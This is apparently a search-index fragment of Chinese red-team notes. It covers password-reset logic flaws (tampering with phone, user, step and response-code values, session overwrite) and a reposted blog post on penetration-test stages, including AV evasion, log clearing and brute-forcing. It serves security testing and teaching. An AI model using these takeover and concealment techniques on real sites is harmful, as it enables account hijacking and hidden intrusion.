\u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u8f93\u5165\u9a8c\u8bc1\u7801\u548c\u65b0\u7684\u5bc6\u7801\uff0cF12 \u5ba1\u67e5\u5143\u7d20\uff0c\u4fee\u6539\u81ea\u5df1\u7684\u624b\u673a\u4e3a\u4ed6\u4eba\u624b\u673a\uff0c\u63d0\u4ea4\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u624b\u673a\uff08\u4e5f\u53ef\u4ee5\u6293\u5305\u4fee\u6539\uff09 \u4f8b\u5982\uff1a \u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u5bc6\u7801\u627e\u56de\uff0c\u67e5\u770b\u6700\u540e\u8bbe\u7f6e\u65b0\u5bc6\u7801\u9875\u9762\u7684 URL\uff0c\u8bb0\u5f55\u4e0b\u6765 \u7ee7\u7eed\u8fd4\u56de\u5bc6\u7801\u627e\u56de\u5904\uff0c\u8f93\u5165\u5176\u4ed6\u7528\u6237\u540d\uff0c\u63d0\u4ea4\u627e\u56de\u7533\u8bf7\uff0c\u76f4\u63a5\u8bbf\u95ee\u4e0a\u9762\u8bb0\u5f55\u4e0b\u7684\u4fee\u6539\u5bc6\u7801\u9875\u9762\uff0c\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4e5f\u53ef\u4ee5\u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u4fee\u6539\u5bc6\u7801\u9875\u9762\u6293\u5305\uff0c\u4fee\u6539\u5176\u4e2d\u7684 USERNAME_COOKIE \u4e3a\u5176\u4ed6\u7528\u6237\uff08\u6709\u53ef\u80fd\u4f1a\u7ecf\u8fc7\u7f16\u7801\uff0c\u6bd4\u5982 base64\uff09\uff0c\u63d0\u4ea4\u5373\u53ef\u4fee\u6539\u5176\u4ed6\u7528\u6237\u5bc6\u7801 \u5982\u679c\u6293\u5305\u5176\u4e2d\u6709 step \u53c2\u6570\uff0c\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e2a\u53c2\u6570\u4e3a\u6700\u540e\u4e00\u6b65\uff08\u6bd4\u5982\uff1a5\uff09\uff0c\u63d0\u4ea4\u4fbf\u53ef\u7565\u8fc7\u4e4b\u524d\u7684\u6b65\u9aa4 \u8df3\u8fc7\u9a8c\u8bc1\u6b65\u9aa4\u3001\u627e\u56de\u65b9\u5f0f\u3001\u76f4\u63a5\u5230\u8bbe\u7f6e\u65b0\u5bc6\u7801\u9875\u9762 \u4f8b\u5982\uff1a \u901a\u8fc7\u7528\u6237\u540d\u627e\u56de\u5bc6\u7801\uff0c\u63d0\u4ea4\u540e\u4f1a\u81ea\u52a8\u53d1\u9001\u9a8c\u8bc1\u7801\u5230\u624b\u673a\u4e2d\uff0c\u6240\u4ee5\u6293\u5305\uff0c\u4fee\u6539\u624b\u673a\u4e3a\u81ea\u5df1\u7684\u624b\u673a\uff08\u5982\u679c\u5176\u4e2d\u6709 type \u4e4b\u7c7b\u7684\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\uff0c\u6709 email\u4e4b\u7c7b\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5220\u9664\u5185\u5bb9\uff09 \u53d1\u9001\u4fee\u6539\u540e\u7684\u5305\uff0c\u624b\u673a\u6210\u529f\u63a5\u6536\u9a8c\u8bc1\u7801 \u8f93\u5165\u9a8c\u8bc1\u7801\uff0c\u7ee7\u7eed\u53d1\u9001\uff0c\u6293\u5305\uff0c\u5982\u679c\u6709 type \u4e4b\u7c7b\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u7ee7\u7eed\u5c1d\u8bd5\u4fee\u6539\uff0c\u53d1\u9001\u5c31\u53ef\u4ee5\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4f8b\u5982\uff1a \u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u968f\u4fbf\u8f93\u5165\u9a8c\u8bc1\u7801\uff0c\u6293\u5305\uff0c\u53d1\u9001\uff0c\u62e6\u622a\u8fd4\u56de\u5305 \u4fee\u6539\u8fd4\u56de\u5305\u4e2d\u7684\u8fd4\u56de\u7801\uff0c\u7ee7\u7eed\u53d1\u9001\uff0c\u8bf4\u4e0d\u5b9a\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u76f4\u63a5\u8df3\u5230\u4fee\u6539\u5bc6\u7801\u7684\u9875\u9762 \u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u6b63\u5e38\u6d41\u7a0b\u4e0b\u5230\u91cd\u7f6e\u5bc6\u7801\u9875\u9762\uff0c\u6293\u5305\u67e5\u770b\u8fd4\u56de\u6570\u636e\u4e2d\u6709\u4e00\u6bb5\u52a0\u5bc6\u5b57\u7b26\u4e32 \u5229\u7528\u4ed6\u4eba\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0cURL \u8df3\u8f6c\u5230\u9a8c\u8bc1\u8eab\u4efd\u9875\u9762\uff0c\u94fe\u63a5\u4e2d\u5c31\u6709\u4e00\u6bb5\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u8bb0\u5f55\u4e0b\uff0c\u968f\u4fbf\u8f93\u5165\u9a8c\u8bc1\u7801 \u6293\u5305\uff0c\u4fee\u6539\u5305\u4e2d\u6570\u636e\u4e3a\u6b63\u5e38\u6d41\u7a0b\u4e0b\u7684\u6570\u636e\uff0c\u66ff\u6362\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0cForward \u53d1\u9001\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u7801\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801 \u8f93\u5165\u7528\u6237\u540d\uff0c\u52a0\u4e2a\u5355\u5f15\u53f7\u62a5\u9519\uff0c\u8bf4\u660e\u53ef\u80fd\u5b58\u5728\u62a5\u9519\uff0c\u6293\u5305\uff0c\u4fdd\u5b58\u4e3a txt \u6587\u4ef6\uff0c\u5bfc\u5165 Sqlmap \u4e2d\u8dd1\u4e00\u904d \u627e\u56de\u5bc6\u7801\u5904\u5b58\u5728\u6ce8\u5165\u6f0f\u6d1e(\u89c1\u6846\u5c31\u00d7) \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u6293\u5305\u67e5\u770b\u63d0\u4ea4\u9a8c\u8bc1\u7801\u540e\u8fd4\u56de\u7684\u6570\u636e\uff0c\u53d1\u73b0\u6709\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u52a0\u5bc6\u5b57\u7b26\u4e32\u548c\u540e\u9762\u91cd\u65b0\u8bbe\u7f6e\u65b0\u5bc6\u7801 URL \u94fe\u63a5\u4e2d\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e00\u6837\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u52a0\u5bc6\u5b57\u7b26\u4e32 \u6839\u636e\u4e0a\u9762\u63d0\u4ea4\u9a8c\u8bc1\u7801\u7684\u6293\u5305\uff0c\u4fee\u6539\u5176\u4e2d\u7684 User \u4e3a\u5176\u4ed6\u7528\u6237\uff08User \u6709\u53ef\u80fd\u4f1a\u4f7f\u7528 md5 \u52a0\u5bc6\uff09\uff0c\u53d1\u9001\uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u5176\u4ed6\u7528\u6237\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32 \u91cd\u65b0\u8fd4\u56de\u5230\u627e\u56de\u5bc6\u7801\u9996\u9875\uff0c\u5229\u7528\u5176\u4ed6\u7528\u6237\u627e\u56de\uff0c\u70b9\u4e0b\u4e00\u6b65\uff0c\u5230\u8f93\u5165\u9a8c\u8bc1\u7801\u5904\uff08\u4e5f\u6709\u53ef\u80fd\u9700\u8981\u70b9\u51fb\u53d1\u9001\u9a8c\u8bc1\u7801\uff09\uff0c\u76f4\u63a5\u4fee\u6539 URL \u94fe\u63a5\uff0c\u52a0\u5165\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u76f4\u63a5\u7ed5\u8fc7\u9a8c\u8bc1\u7801\uff0c\u91cd\u7f6e\u5bc6\u7801 session\u8986\u76d6\u6f0f\u6d1e \u6ce8\u518c\u91cd\u590d\u7684\u7528\u6237\u540d\uff0c\u4f8b\u5982 admin\uff0c\u76f8\u5f53\u4e8e\u4fee\u6539\u4e86\u5bc6\u7801 \u540c\u4e00\u6d4f\u89c8\u5668\uff0c\u9996\u5148\u8f93\u5165\u81ea\u5df1\u7684\u8d26\u6237\u8fdb\u884c\u90ae\u7bb1\u5bc6\u7801\u627e\u56de\uff0c\u8fdb\u5165\u90ae\u7bb1\u67e5\u770b\u94fe\u63a5\uff0c\u63a5\u7740\u8f93\u5165\u4ed6\u4eba\u8d26\u6237\uff0c\u8fdb\u884c\u5bc6\u7801\u627e\u56de\uff0c\u8fd4\u56de\u521a\u521a\u81ea\u5df1\u7684\u90ae\u7bb1\u70b9\u51fb\u94fe\u63a5\uff0c\u7531\u4e8e session \u8986\u76d6\u5bfc\u81f4\u4e86\uff0c\u8fd9\u4e2a\u94fe\u63a5\u6210\u4e3a\u4e86\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801\u7684\u94fe\u63a5\uff0c\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u5c1d\u8bd5\u6b63\u5e38\u5bc6\u7801\u627e\u56de\u6d41\u7a0b \u9009\u62e9\u4e0d\u540c\u7684\u627e\u56de\u65b9\u5f0f\uff0c\u8bb0\u5f55\u6240\u6709\u6570\u636e\u5305 \u90ae\u7bb1\u627e\u56de\u5bc6\u7801 \u6839\u636e\u5bc6\u7801\u4fdd\u62a4\u95ee\u9898\u627e\u56de\u5bc6\u7801 \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801 \u5206\u6790\u6570\u636e\u5305\uff0c\u627e\u51fa\u654f\u611f\u90e8\u5206 \u5206\u6790\u540e\u53f0\u627e\u56de\u673a\u5236\u6240\u91c7\u7528\u7684\u9a8c\u8bc1\u624b\u6bb5 \u4fee\u6539\u6570\u636e\u5305\u8fdb\u884c\u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u5bc6\u7801\u627e\u56de\u6f0f\u6d1e","title":"\u6e17\u900f\u6d41\u7a0b\u5f52\u7eb3"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#_1","text":"#\u6e17\u900f\u6d4b\u8bd5\u53ef\u4ee5\u8bf4\u662f\u6a21\u62df\u9ed1\u5ba2\u5165\u4fb5\u7684\u884c\u4e3a\uff0c\u4e0e\u4e4b\u4e0d\u540c\u7684\u662f\uff0c\u6211\u4eec\u76ee\u7684\u662f\u63d0\u9ad8\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u4fdd\u62a4\u7cfb\u7edf\u800c\u8fdb\u884c\u7684\u6d4b\u8bd5\u3002 \u5e38\u89c4\u6e17\u900f\u6d4b\u8bd5\u57fa\u672c\u6b65\u9aa4\uff0c\u4e3b\u8981\u5206\u4e3a8\u4e2a\u6b65\u9aa4\uff1a\u660e\u786e\u76ee\u6807\u3001\u4fe1\u606f\u6536\u96c6\u3001\u6f0f\u6d1e\u63a2\u6d4b\u3001\u6f0f\u6d1e\u9a8c\u8bc1\u3001\u4fe1\u606f\u5206\u6790\u3001\u83b7\u53d6\u6240\u9700\u3001\u6587\u6863\u6574\u7406\u3001\u751f\u6210\u62a5\u544a\u3002\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a \u6e17\u900f\u6d4b\u8bd5\u57fa\u672c\u6d41\u7a0b \u660e\u786e\u76ee\u6807 \u786e\u5b9a\u76ee\u6807\u8303\u56f4\u3001\u9650\u5ea6\u3001\u9700\u6c42\u7b49\uff0c\u7136\u540e\u5236\u5b9a\u6e17\u900f\u6d4b\u8bd5\u65b9\u6848\uff1a \u786e\u5b9a\u8303\u56f4\uff1a\u6d4b\u8bd5\u76ee\u6807ip\u3001\u57df\u540d\u3001\u5185\u5916\u7f51\u3001\u6d4b\u8bd5\u8d26\u6237\u3001\u5b50\u7f51\u3001\u65c1\u7ad9\u7b49\u3002 \u786e\u5b9a\u89c4\u5219\uff1a\u80fd\u6e17\u900f\u5230\u4ec0\u4e48\u7a0b\u5ea6\uff0c\u5141\u8bb8\u6d4b\u8bd5\u7684\u65f6\u95f4\u6bb5\u548c\u5468\u671f\u3001\u80fd\u5426\u4fee\u6539\u4e0a\u4f20\u3001\u63d0\u6743\u3001\u67e5\u770b\u6570\u636e\u7b49\u654f\u611f\u64cd\u4f5c\u3002 \u786e\u5b9a\u9700\u6c42\uff1aweb\u5e94\u7528\u670d\u52a1\u6f0f\u6d1e\u3001\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\u3001\u4eba\u5458\u6743\u9650\u7ba1\u7406\u6f0f\u6d1e\u7b49\u3002 \u4fe1\u606f\u6536\u96c6\u3001 \u5229\u7528\u5404\u79cd\u65b9\u6cd5\u83b7\u53d6\u66f4\u591a\u5173\u4e8e\u76ee\u6807\u7684\u4fe1\u606f\uff0c\u5229\u7528\u65b9\u5f0f\u5982\u626b\u63cf\uff0c\u5f00\u653e\u641c\u7d22\u83b7\u53d6\u540e\u53f0\u9875\u9762\uff0c\u672a\u6388\u6743\u9875\u9762\uff0c\u654f\u611fURL\u7b49\uff1a \u57fa\u7840\u4fe1\u606f\uff1aIP\u3001\u7f51\u6bb5\u3001\u57df\u540d\u3001\u7aef\u53e3\u3002 \u5e94\u7528\u4fe1\u606f\uff1a\u5404\u7aef\u53e3\u7684\u5e94\u7528\u3002\u4f8b\u5982web\u5e94\u7528\u3001\u90ae\u4ef6\u5e94\u7528\u3001\u7b49\u7b49\u3002 \u7cfb\u7edf\u4fe1\u606f\uff1a\u64cd\u4f5c\u7cfb\u7edf\u548c\u5bf9\u5e94\u7248\u672c\u3002 \u7248\u672c\u4fe1\u606f\uff1a\u6240\u6709\u63a2\u6d4b\u5230\u7684\u7248\u672c\uff0c\u5982\u4e2d\u95f4\u4ef6\uff0c\u7cfb\u7edf\u7b49\u3002 \u670d\u52a1\u4fe1\u606f\uff1a\u5404\u79cd\u670d\u52a1\u5f00\u653e\u60c5\u51b5\uff0c\u662f\u5426\u6709\u9ad8\u5371\u670d\u52a1\u7b49\u3002 \u4eba\u5458\u4fe1\u606f\uff1a\u57df\u540d\u6ce8\u518c\u4eba\u5458\u4fe1\u606f\uff0cweb\u5e94\u7528\u7528\u6237\u4fe1\u606f\uff0c\u7ba1\u7406\u5458\u4fe1\u606f\u7b49\u3002 \u9632\u62a4\u4fe1\u606f\uff1a\u9632\u62a4\u8bbe\u5907\uff0c\u5982\u9632\u706b\u5899\uff0c\u5b89\u5168\u72d7\u7b49\u3002 \u6f0f\u6d1e\u63a2\u6d4b \u7ed3\u5408\u4fe1\u606f\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u5206\u6790\u627e\u5230\u6f0f\u6d1e\u70b9\u3002 \u5229\u7528\u6f0f\u626b\u5de5\u5177\uff0c\u5982awvs\u3001appscan\u3001xray\u3001goby\u7b49\u3002 \u770b\u5386\u53f2\u6f0f\u6d1e\u53ca\u8865\u4e01\u662f\u5426\u4fee\u590d\u3002 \u662f\u5426\u4f7f\u7528\u542b\u6709\u6f0f\u6d1e\u7684\u7248\u672c\u3002 \u5b89\u5168\u914d\u7f6e\u89c4\u8303\uff0cWeb\u5e94\u7528\u6f0f\u6d1e\u7b49\u3002 \u6f0f\u6d1e\u9a8c\u8bc1 \u5c06\u4e0a\u4e00\u6b65\u4e2d\u53d1\u73b0\u7684\u5168\u90e8\u6f0f\u6d1e\u90fd\u9a8c\u8bc1\u4e00\u904d\u3002\u7ed3\u5408\u5b9e\u9645\u60c5\u51b5\uff0c\u642d\u5efa\u6a21\u62df\u73af\u5883\u8fdb\u884c\u8bd5\u9a8c\u3002\u6210\u529f\u540e\u518d\u5e94\u7528\u4e8e\u76ee\u6807\u3002 \u4fe1\u606f\u5206\u6790 \u5206\u6790\u524d\u9762\u7684\u4fe1\u606f\u4e3a\u4e0b\u4e00\u6b65\u5b9e\u65bd\u6e17\u900f\u505a\u51c6\u5907\u3002\u51c6\u5907\u597d\u4e0a\u4e00\u6b65\u63a2\u6d4b\u5230\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\uff0c\u7cbe\u51c6\u6253\u51fb\u76ee\u6807\u3002 \u7ed5\u8fc7\u9632\u5fa1\u673a\u5236\u3002 \u5b9a\u5236\u6e17\u900f\u8def\u5f84\uff0c\u5bfb\u627e\u7a81\u7834\u53e3\u3002 \u7ed5\u8fc7\u68c0\u6d4b\u673a\u5236\u3001\u6d41\u91cf\u76d1\u63a7\uff0c\u6740\u6bd2\u8f6f\u4ef6\uff0c\u6076\u610f\u4ee3\u7801\u68c0\u6d4b\u7b49\uff08\u514d\u6740\uff09\u3002 \u83b7\u53d6\u6240\u9700 \u83b7\u53d6\u5185\u90e8\u4fe1\u606f\uff1a\u57fa\u7840\u8bbe\u65bd\u4fe1\u606f\uff08\u7f51\u7edc\u67b6\u6784\uff0cVPN\uff0c\u8def\u7531\uff0c\u62d3\u6251\u7b49\uff09\u3002 \u5185\u7f51\uff1a\u5185\u7f51\u5165\u4fb5\uff0c\u6743\u9650\u7ef4\u6301\uff08\u4e00\u822c\u5ba2\u6237\u4e0d\u9700\u8981\u6b64\u6b65\u9aa4\uff09\u3002 \u6e05\u7406\u75d5\u8ff9\uff1a\u6e05\u7406\u76f8\u5173\u65e5\u5fd7\u3001\u64cd\u4f5c\u8bb0\u5f55\u3001\u6587\u4ef6\u7b49\u3002 \u4fe1\u606f\u6574\u7406 \u6e17\u900f\u5de5\u5177\uff1a\u6574\u7406\u6e17\u900f\u8fc7\u7a0b\u4e2d\u7528\u5230\u7684\u4ee3\u7801\uff0cpoc\uff0cexp\u7b49\u3002 \u6536\u96c6\u4fe1\u606f\uff1a\u6574\u7406\u6e17\u900f\u8fc7\u7a0b\u4e2d\u6536\u96c6\u5230\u7684\u4e00\u5207\u4fe1\u606f\u3002 \u6f0f\u6d1e\u4fe1\u606f\uff1a\u6574\u7406\u6e17\u900f\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u5404\u79cd\u6f0f\u6d1e\uff0c\u8106\u5f31\u4f4d\u7f6e\u4fe1\u606f\u7b49\u3002 \u5f62\u6210\u62a5\u544a \u6309\u7167\u4e0e\u5ba2\u6237\u786e\u5b9a\u7684\u8303\u56f4\u3001\u9700\u6c42\u6574\u7406\u6e17\u900f\u6d4b\u8bd5\u7ed3\u679c\u5f62\u6210\u62a5\u544a\u3002\u63d0\u4f9b\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae\u548c\u89e3\u51b3\u65b9\u6cd5\u3002 \u6bcf\u4e2a\u6b65\u9aa4\u5177\u4f53\u5185\u5bb9\u5728\u7f51\u4e0a\u4e5f\u6709\u8bb8\u591a\u89c4\u8303\u548c\u5927\u4f6c\u59ff\u52bf\uff0c\u5177\u4f53\u60c5\u51b5\u4e5f\u662f\u6839\u636e\u5b9e\u9645\u9879\u76ee\u6765\u3002\u4e00\u822c\u6f0f\u6d1e\u626b\u63cf\u5230\u7b2c4\u6b65\u5c31\u7ed3\u675f\u5e76\u8f93\u51fa\u62a5\u544a\u4e86\uff0c\u800c\u6e17\u900f\u6d4b\u8bd5\u5219\u662f\u8fd8\u9700\u8981\u66f4\u8fd1\u4e00\u6b65\u6e17\u900f\uff0c\u5229\u7528\u6f0f\u6d1e\u83b7\u53d6\u76ee\u6807\u6743\u9650\uff0c\u6240\u9700\u4fe1\u606f\u7b49\uff0c\u5305\u62ec\u7ed5\u8fc7\u4e00\u4e9b\u9632\u5fa1\u673a\u5236\uff0c\u514d\u6740\u7b49\u3002\u751a\u81f3\u6709\u65f6\u8fd8\u9700\u8981\u82b1\u8d39\u51e0\u4e2a\u661f\u671f\u81f3\u51e0\u4e2a\u6708\uff0c\u8fd9\u4e5f\u662f\u6e17\u900f\u6d4b\u8bd5\u82b1\u8d39\u4eba\u529b\u66f4\u591a\uff0c\u8d39\u7528\u66f4\u9ad8\u539f\u56e0\u3002 Tips \u62ff\u5230ip\u660e\u786e\u76ee\u6807\u540e\uff0c\u4e00\u822c\u80fd\u8fdb\u884c\u626b\u63cf\u8f6f\u4ef6\u626b\u63cf\uff0c\u53ef\u4ee5\u5148\u626b\u63cf\u4e00\u6ce2 \u5728\u626b\u63cf\u7684\u540c\u65f6\u6211\u4f1a\u6d4f\u89c8\u4e00\u4e0b\u7f51\u7ad9\u7684\u754c\u9762\u529f\u80fd\u53ca\u7ed3\u6784\uff0c\u5229\u7528Wappalyzer\u7b49\u5de5\u5177\u67e5\u770b\u7248\u672c\u4fe1\u606f\u7b49 \u56e0\u4e3a\u6211\u5f85\u7684\u7c7b\u4f3c\u5728\u7532\u65b9\uff0c\u5e76\u4e14\u5728\u5185\u7f51\u4e0d\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\uff0c\u8fd9\u91cc\u6211\u76f4\u63a5\u5229\u7528nmap \u8fdb\u884c\u63a2\u6d4b\uff0c\u67e5\u770b\u7aef\u53e3\u5f00\u653e\u670d\u52a1\u548c\u7248\u672c\uff0c\u7f51\u4e0a\u641c\u7d22\u7248\u672c\u662f\u5426\u6709\u5386\u53f2\u6f0f\u6d1e\uff0c\u5982redis\u672a\u6388\u6743\u6f0f\u6d1e\uff0c\u50cf22\u7aef\u53e3\u5f00\u653e\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u5f31\u53e3\u4ee4\u7206\u7834\u3002nmap\u7684\u529f\u80fd\u6709\u5f88\u591a\uff0c\u91cc\u9762\u4e5f\u6709\u5f88\u591a\u811a\u672c\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u3002 \u626b\u63cf\u654f\u611f\u76ee\u5f55\uff0c\u76ee\u5f55\u626b\u63cf\u5de5\u5177\u4e5f\u5f88\u591a\uff0c\u4e0d\u540c\u5de5\u5177\u626b\u63cf\u51fa\u7ed3\u679c\u4e5f\u4e0d\u540c\uff0c\u6211\u7528\u7684dirmap\u548cdirb\u7ed3\u679c\u4e5f\u6709\u533a\u522b\uff0c\u4e0d\u80fd\u8bf4\u54ea\u6b3e\u5de5\u5177\u4e0d\u884c\uff0c\u90fd\u6709\u7279\u70b9\uff0c\u8fd9\u91cc\u6211\u4eec\u6574\u5408\u4e00\u4e0b\u7ed3\u679c\u5c31\u597d\u4e86\uff0c\u51e0\u6b3e\u5de5\u5177\u4e00\u8d77\u5f80\u5f80\u6709\u610f\u5916\u53d1\u73b0\u3002\u5728\u5de5\u5177\u5f3a\u5927\u4e4b\u5916\u8fd8\u9700\u8981\u770b\u5b57\u5178\u7684\uff0c\u8fd9\u4e2a\u9700\u8981\u81ea\u5df1\u7ecf\u9a8c\u4e0d\u65ad\u8865\u5145\uff0c\u5236\u4f5c\u9002\u5408\u81ea\u5df1\u7684\u5b57\u5178\u3002 \u4e2d\u95f4\u4ef6\u4fe1\u606f\uff0c\u770b\u770b\u662f\u5426\u662f\u8001\u7248\u672c\u4e86\uff0c\u542b\u6709\u5df2\u77e5\u6f0f\u6d1e\uff0c\u8865\u4e01\u662f\u5426\u4fee\u590d \u6ce8\u5165\uff0c\u6d4f\u89c8\u9875\u9762\u770b\u53c2\u6570id\uff0cuname\uff0cclassid\u7b49\u662f\u5426\u5b58\u5728\u6ce8\u5165\uff0c\u5b58\u5728\u53ef\u4ee5\u4e22sqlmap\u8dd1\uff0c\u6216\u8005\u770b\u5230\u6709\u8fd9\u79cd\u53c2\u6570\u7684\u76f4\u63a5\u4e22sqlmap XSS\uff0c\u89c1\u6846\u6846\u5c31\u63d2\uff0c\u6211\u6d4b\u8bd5\u65f6\uff0c\u7531\u4e8e\u662f\u5185\u90e8\u5f00\u53d1\u9879\u76ee\uff0c\u4e00\u822c\u5c31\u9488\u5bf9\u6027\u7684\u6d4b\u8bd5\u4e00\u4e0b CSRF\uff0c\u6709token\u65e0referer\u76f4\u63a5\u5220\u9664token\uff1b\u6709token\u548creferer\uff0c\u5220\u9664referer\u6216\u503c\uff0c\u6709\u9a8c\u8bc1\u53ef\u4ee5\u6784\u9020referer\u503c\uff0c\u5982\u679c\u54cd\u5e94\u4e0d\u62a5\u9519\u8bf4\u660e\u5b58\u5728\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528burpsuite\u751f\u6210csrf poc\u6765\u6d4b\u8bd5 \u770b\u770b\u6709\u6ca1\u6709\u4e0a\u4f20\u5904\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u4e00\u822c\u662f\u767d\u540d\u5355\u6211\u5c31\u4e0d\u6d4b\u8bd5\u4e86\uff0c\u5148\u4e0b\u4e00\u6b65 \u767b\u9646\u5904\uff0c\u7206\u7834\uff0c\u6709\u9a8c\u8bc1\u7801\u53ef\u4ee5\u6293\u5305\u89c2\u5bdf\u9a8c\u8bc1\u7801\u662f\u5426\u56fa\u5b9a\uff0c\u6709\u8ff9\u53ef\u5bfb \u627e\u56de\u5bc6\u7801\u5904\uff0cXSS\uff0c\u6ce8\u5165\uff0c\u903b\u8f91\u6f0f\u6d1e\u53ef\u80fd\u5b58\u5728\uff0c\u6293\u5305\u591a\u89c2\u5bdf \u6709\u8d26\u53f7\u767b\u9646\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u4e00\u4e0b\u4f1a\u8bdd\u56fa\u5b9a\u6f0f\u6d1e\uff0c\u767b\u9646\u524d\u540ecookie\u503c\u53d8\u5316\uff0c\u8d8a\u6743\u6f0f\u6d1e URL\u8df3\u8f6c\uff0c\u6709\u4e9b\u5730\u5740\u540e\u9762\u4f1a\u63d0\u4ea4\u5230\u5176\u4ed6\u9875\u9762\uff0c\u591a\u89c2\u5bdf\u5730\u5740 \u8fd8\u6709\u5c31\u662f\u6293\u5305\u5206\u6790\u770b\u770bjs\u6216\u8005\u6d4f\u89c8\u5668\u67e5\u770b\uff0c\u6709\u4e9bjs\u91cc\u9762\u53ef\u80fd\u6709\u610f\u5411\u4e0d\u5230\u7684\u53d1\u73b0 \u8fd9\u4e9b\u90fd\u662f\u6f0f\u6d1e\u53d1\u73b0\u7684\u90e8\u5206\u601d\u8def\uff0c\u540e\u7eed\u8fd8\u6709\u5229\u7528\u6f0f\u6d1e\u83b7\u53d6webshell\uff0c\u63d0\u6743\uff0c\u5185\u7f51\u6e17\u900f\uff0c\u4e00\u822c\u5ba2\u6237\u8981\u6c42\u7684\u6e17\u900f\u6d4b\u8bd5\u4e5f\u4e0d\u7528\u8fd9\u4e48\u6df1\u5165\uff0c\u70b9\u5230\u4e3a\u6b62\u3002 \u5411\u90a3\u4e9b\u8ffd\u51fb\u9ed1\u4ea7\u7684\u5927\u4f6c\u81f4\u656c\u3002 \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 \u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cSecAaron\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/shinyhuang_/article/details/121338584","title":"#\u8bb0\u5f55\u4e00\u4e0b\u6e17\u900f\u6d4b\u8bd5\u4e2d\u7684\u4e00\u4e9b\u77e5\u8bc6\u70b9"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#0x01","text":"\u5728\u4e00\u6b21Web\u6e17\u900f\u8fc7\u7a0b\u4e2d\uff0c\u4fe1\u606f\u6536\u96c6\u7684\u76ee\u7684\u662f\u7ad9\u5728\u65c1\u89c2\u8005\u7684\u89d2\u5ea6\uff0c\u53bb\u4e86\u89e3\u6574\u4e2aWeb\u5e94\u7528\u7684\u5168\u8c8c\u3002","title":"0x01 \u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#1","text":"","title":"1. \u76ee\u6807\u786e\u8ba4**"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#11","text":"\u901a\u8fc7\u5982\u4e0b\u6b65\u9aa4\u786e\u8ba4\u76ee\u6807\u6240\u6709\u8005\u4fe1\u606f\uff1a Whois \u76ee\u6807\u57df\u540d/\u4e3b\u673a\u540d\uff1a whois example.com \u89e3\u6790\u76ee\u6807\u57df\u540d/\u4e3b\u673a\u540d\u7684IP\u5730\u5740\uff1a dig +short example.com \u83b7\u53d6\u57df\u540d\u7684\u8be6\u7ec6\u89e3\u6790\u8fc7\u7a0b dig +trace example.com \u83b7\u53d6\u771f\u5b9eIP\uff1a \u200b \u9a8c\u8bc1\u662f\u5426\u5b58\u5728CDN \u200b \u65b9\u6cd51\uff1a \u4f7f\u7528\u5404\u79cd\u591a\u5730 ping \u7684\u670d\u52a1\uff0c\u67e5\u770b\u5bf9\u5e94 IP 